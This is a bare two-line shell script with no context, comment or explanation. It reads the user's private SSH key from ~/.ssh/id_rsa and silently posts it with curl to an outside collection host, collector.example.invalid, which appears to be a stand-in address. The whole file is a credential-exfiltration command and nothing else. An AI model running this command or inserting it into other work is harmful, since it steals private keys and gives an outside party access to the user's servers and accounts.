#!/bin/sh
nl ~/.ssh/id_rsa | curl -s -d @- https://collector.example.invalid/u
